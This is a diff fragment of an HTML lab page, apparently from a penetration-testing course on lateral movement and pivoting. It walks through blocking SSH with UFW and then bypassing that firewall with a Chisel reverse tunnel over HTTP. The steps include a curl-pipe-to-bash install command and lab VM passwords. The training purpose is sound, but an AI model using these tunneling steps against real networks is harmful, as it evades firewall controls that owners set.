+    !IMAGE[Screenshot](screens/zcyiy1b4.jpg)
+
+9. [] Type **sudo su** in the terminal and press enter. 
+
+10. [] Type **toor** when prompted for a password, and press Enter to gain root privileges.
+
+    !IMAGE[Screenshot](screens/z5z3n20y.jpg)
+
+11. [] Enable the **Uncomplicated Firewall (UFW)** on the Ubuntu machine and configure firewall rules to allow only HTTP and HTTPS traffic by running the following commands:
+
+    - ufw enable
+
+    - ufw allow 80/tcp
+
+    - ufw allow 443/tcp
+
+    !IMAGE[Screenshot](screens/4yqbszjj.jpg)
+
+    &gt;[!knowledge] This configuration ensures that only HTTP (port 80) and HTTPS (port 443) traffic is allowed through the firewall, blocking other types of traffic like SSH by default.
+
+12. [] Add a new user **bob** on the Ubuntu Machine using the following command: **sudo adduser bob**
+
+    &gt;[!Note] Set Password as **Bob@123** and leave the remaining fields blank and press **Enter**. If you get **Is the information correct ? [Y/N]** type *Y* and press **Enter**
+
+    !IMAGE[Screenshot](screens/lu101qat.jpg)
+
+    &gt;[!Note] This creates a new user account, **bob**, which will be used for SSH login after tunneling is established.
+
+13. [] Switch back to @lab.VirtualMachine(ParrotSecurity).SelectLink VM and test SSH access to the Ubuntu machine.
+
+    !IMAGE[Screenshot](screens/ctc4ldyd.jpg)
+
+14. [] Try to SSH into the Ubuntu machine using the following command: **ssh bob@192.168.0.19**. This should fail because the firewall on the Ubuntu machine is blocking SSH traffic (port 22).
+
+    !IMAGE[Screenshot](screens/2vwmkvvz.jpg)
+
+15. [] Now install Chisel on Both machines to enable tunneling and bypass these firewall restrictions. On both Parrot Security and @lab.VirtualMachine(Ubuntu22.04.3CPENT).SelectLink, run the following command to install Chisel:
+
+    **curl https://i.jpillora.com/chisel! | bash**
+
+    !IMAGE[Screenshot](screens/pcctq2ua.jpg)
+
+    !IMAGE[Screenshot](screens/25s5m1ul.jpg)
+
+16. [] On the @lab.VirtualMachine(ParrotSecurity).SelectLink machine, start the Chisel server in reverse tunneling mode with the following command:
+
+    **sudo chisel server -p 80 --reverse**
+
+    !IMAGE[Screenshot](screens/arkpk1bd.jpg)
+
+    &gt;[!knowledge] This command sets up Chisel to listen on port 80 (the standard HTTP port) and enables reverse tunneling, which means the Ubuntu machine will connect to this server to create a tunnel for forwarding SSH traffic.
+
+17. [] On the @lab.VirtualMachine(Ubuntu22.04.3CPENT).SelectLink machine, start the Chisel client, and set up a reverse SSH tunnel by running the following command:
+
+    **chisel client 192.168.0.18:80 R:2222:127.0.0.1:22**
+
+    !IMAGE[Screenshot](screens/hiddfi2j.jpg)
+
+    &gt;[!knowledge] This command creates a reverse SSH tunnel, forwarding SSH traffic (port 22) from the Ubuntu machine to port 2222 on the Parrot machine. The R:2222:127.0.0.1:22 option tells Chisel to forward traffic from port 2222 on the Parrot machine to port 22 (SSH) on the local machine (Ubuntu).
+
+18. [] Now both the server @lab.VirtualMachine(ParrotSecurity).SelectLink and client @lab.VirtualMachine(Ubuntu22.04.3CPENT).SelectLink are connected via HTTP tunneling. 
+
+    !IMAGE[Screenshot](screens/nl24owxx.jpg)
+
+    !IMAGE[Screenshot](screens/sd4id3if.jpg)
+
+19. [] In the @lab.VirtualMachine(ParrotSecurity).SelectLink machine, open the new terminal.
+
+    !IMAGE[Screenshot](screens/iqezl3ig.jpg)
+
+20. [] Now, try to SSH into the Ubuntu machine through the forwarded tunnel from the **Parrot Security** by running:
+
+    **ssh -p 2222 bob@127.0.0.1**
+
+    &gt;[!Note] Type **Yes** and enter Password as **Bob@123**.
+
+    !IMAGE[Screenshot](screens/u4vyayxs.jpg)
+
+    !IMAGE[Screenshot](screens/rkh313zd.jpg)
+    
+    &gt;[!knowledge] This command connects to the Ubuntu machine using the SSH service forwarded over the HTTP tunnel. The -p 2222 option specifies the port on the Parrot machine to connect to, while 127.0.0.1 directs the traffic to the local tunnel endpoint.
+
+21. [] Open Wireshark and double-click **eth0** to capture tunneling traffic between the client and pentester machines. If it asks for a password, type **toor** as the password.
+
+    !IMAGE[Screenshot](screens/ejt5sblx.jpg)
+
+    !IMAGE[Screenshot](screens/khym5tz2.jpg)
+
+22. [] In the Filter bar, type **tcp.port == 80** to filter HTTP Tunnelling traffic between Client machine i.e **192.168.0.19** and Pentester machine **192.168.0.18**.
+
+    !IMAGE[Screenshot](screens/2x5n2bf0.jpg)
+
+23. [] Click on any one of the captured packets to view the HTTP requests in detail.
+
+    !IMAGE[Screenshot](screens/bfrpb5j2.jpg)
+
+24. [] By completing this lab, you have successfully used Chisel to bypass firewall restrictions and establish a secure reverse SSH tunnel over HTTP. This exercise demonstrates the importance of understanding tunneling techniques in penetration testing.">
+    <input type="hidden" id="activities" value="[]">
+    <input type="hidden" id="activityGroups" value="[]">
+    <input type="hidden" id="replacementTokens" value="[{&quot;Token&quot;:&quot;@lab.LabProfile.Id&quot;,&quot;Replacement&quot;:&quot;171429&quot;},{&quot;Token&quot;:&quot;@lab.CtrlAltDelete&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;ctrlAltDeleteLink icon-link special-action-link&#39;&gt;Ctrl+Alt+Delete&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WindowsServer2019).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;270558&#39;&gt;Windows Server 2019&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WindowsServer2019).Username&quot;,&quot;Replacement&quot;:&quot;Administrator&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WindowsServer2019).Password&quot;,&quot;Replacement&quot;:&quot;Pa$$$$w0rd&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WindowsServer2019).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;270558&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WindowsServer2019).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;270558&#39;&gt;Windows Server 2019&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WebServer).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;270559&#39;&gt;Web Server&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WebServer).Username&quot;,&quot;Replacement&quot;:&quot;Administrator&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WebServer).Password&quot;,&quot;Replacement&quot;:&quot;Pa$$$$w0rd&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WebServer).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;270559&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WebServer).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;270559&#39;&gt;Web Server&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Windows11(SecureBootDisabled)).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;270560&#39;&gt;Windows 11&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Windows11(SecureBootDisabled)).Username&quot;,&quot;Replacement&quot;:&quot;Admin&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Windows11(SecureBootDisabled)).Password&quot;,&quot;Replacement&quot;:&quot;Pa$$$$w0rd&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Windows11(SecureBootDisabled)).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;270560&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Windows11(SecureBootDisabled)).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;270560&#39;&gt;Windows 11&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Ubuntu22.04.3CPENT).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;270561&#39;&gt;Ubuntu&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Ubuntu22.04.3CPENT).Username&quot;,&quot;Replacement&quot;:&quot;ubuntu&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Ubuntu22.04.3CPENT).Password&quot;,&quot;Replacement&quot;:&quot;toor&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Ubuntu22.04.3CPENT).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;270561&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(Ubuntu22.04.3CPENT).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;270561&#39;&gt;Ubuntu&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WordpressServer-2).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;270562&#39;&gt;Wordpress Server&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WordpressServer-2).Username&quot;,&quot;Replacement&quot;:&quot;Jason&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WordpressServer-2).Password&quot;,&quot;Replacement&quot;:&quot;toor&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WordpressServer-2).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;270562&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(WordpressServer-2).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;270562&#39;&gt;Wordpress Server&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(2019DCm-8).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;270837&#39;&gt;2019DC&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(2019DCm-8).Username&quot;,&quot;Replacement&quot;:&quot;Administrator&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(2019DCm-8).Password&quot;,&quot;Replacement&quot;:&quot;Pa$$$$w0rd&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(2019DCm-8).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;270837&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(2019DCm-8).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;270837&#39;&gt;2019DC&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(ParrotSecurity).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;268660&#39;&gt;Parrot Security&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(ParrotSecurity).Username&quot;,&quot;Replacement&quot;:&quot;pentester&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(ParrotSecurity).Password&quot;,&quot;Replacement&quot;:&quot;toor&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(ParrotSecurity).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;268660&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(ParrotSecurity).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;268660&#39;&gt;Parrot Security&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(SalesDepartment-m8).SelectLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;selectMachineLink icon-link special-action-link&#39; data-data=&#39;271968&#39;&gt;Sales Department&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(SalesDepartment-m8).Username&quot;,&quot;Replacement&quot;:&quot;Admin&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(SalesDepartment-m8).Password&quot;,&quot;Replacement&quot;:&quot;test@123&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(SalesDepartment-m8).Console&quot;,&quot;Replacement&quot;:&quot;&lt;div class=&#39;virtual-machine-console&#39; data-id=&#39;271968&#39; data-height=&#39;768&#39; data-width=&#39;1024&#39;&gt;&lt;/div&gt;&quot;},{&quot;Token&quot;:&quot;@lab.VirtualMachine(SalesDepartment-m8).NewWindowLink&quot;,&quot;Replacement&quot;:&quot;&lt;a href=&#39;#&#39; class=&#39;open-in-new-window-link icon-link special-action-link machine-new-window-link&#39; data-data=&#39;271968&#39;&gt;Sales Department&lt;/a&gt;&quot;},{&quot;Token&quot;:&quot;@lab.Title&quot;,&quot;Replacement&quot;:&quot;&lt;h1 class=\&quot;lab-title primary-color\&quot;&gt;Lateral Movement and Pivoting&lt;/h1&gt;&quot;},{&quot;Token&quot;:&quot;@lab.LanguageName&quot;,&quot;Replacement&quot;:&quot;English&quot;},{&quot;Token&quot;:&quot;@lab.LanguageCode&quot;,&quot;Replacement&quot;:&quot;en&quot;},{&quot;Token&quot;:&quot;@lab.LanguageRegionCode&quot;,&quot;Replacement&quot;:&quot;en-US&quot;},{&quot;Token&quot;:&quot;@lab.LabInstance.Id&quot;,&quot;Replacement&quot;:&quot;{LAB_INSTANCE_ID}&quot;},{&quot;Token&quot;:&quot;@lab.LabInstance.GlobalId&quot;,&quot;Replacement&quot;:&quot;{lod_LAB_INSTANCE_ID}&quot;},{&quot;Token&quot;:&quot;@lab.LabInstance.StartDate&quot;,&quot;Replacement&quot;:&quot;20250124&quot;},{&quot;Token&quot;:&quot;@lab.User.Id&quot;,&quot;Replacement&quot;:&quot;{USER_ID}&quot;},{&quot;Token&quot;:&quot;@lab.User.FirstName&quot;,&quot;Replacement&quot;:&quot;{USER_FIRSTNAME}&quot;},{&quot;Token&quot;:&quot;@lab.User.LastName&quot;,&quot;Replacement&quot;:&quot;{USER_LASTNAME}&quot;},{&quot;Token&quot;:&quot;@lab.User.Email&quot;,&quot;Replacement&quot;:&quot;{EMAIL}&quot;},{&quot;Token&quot;:&quot;@lab.User.ExternalId&quot;,&quot;Replacement&quot;:&quot;{USER_EXTERNALID}&quot;},{&quot;Token&quot;:&quot;@lab.User.Organization.Id&quot;,&quot;Replacement&quot;:&quot;{USER_ORGANIZATION_ID}&quot;},{&quot;Token&quot;:&quot;@lab.User.Organization.Name&quot;,&quot;Replacement&quot;:&quot;{USER_ORGANIZATION_NAME}&quot;},{&quot;Token&quot;:&quot;@lab.Tag&quot;,&quot;Replacement&quot;:&quot;{TAG}&quot;}]">
+    <input type="hidden" id="replacements">
+    <input type="hidden" id="variables">
+
+    <textarea id="copyInput" value="" style="position: absolute; left:-10000px; top:-10000px; "></textarea>
+
+    <div id="Model" data-id="171429" data-contentroot="https://labondemand.blob.core.windows.net/content/lab171429/" data-scrolltop="" data-themescript="">
+
+
+
+</div></body></html>
